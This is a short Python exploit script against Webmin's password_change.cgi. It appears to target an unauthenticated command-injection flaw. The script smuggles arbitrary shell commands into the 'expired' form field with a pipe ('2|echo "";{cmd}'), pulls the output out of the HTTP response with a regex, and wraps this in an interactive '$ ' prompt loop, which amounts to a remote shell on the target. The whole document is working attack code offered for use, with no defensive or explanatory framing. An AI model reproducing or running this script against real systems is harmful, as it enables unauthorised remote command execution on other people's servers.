import requests
import re
requests.packages.urllib3.disable_warnings()
import sys

def exploit(vuln_url, cmd):
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': sys.argv[1] + "/session_login.cgi",
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    } 
    payload=payload = 'user=gotroot&pam=&expired=2|echo "";{}'.format(cmd)
    r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
    m = re.compile(r"<p>Your password has expired, and a new one must be chosen.(.*)</p>", re.DOTALL)
    cmd_result = m.findall(r.text)[0]
    print(cmd_result)

if (len(sys.argv) < 2):
    print("usage: python3 {} http://10.10.10.10:10000".format(sys.argv[0]))
    exit()

url = sys.argv[1] + "/password_change.cgi" 
while True:
    cmd = input("$ ")
    exploit(url,cmd)
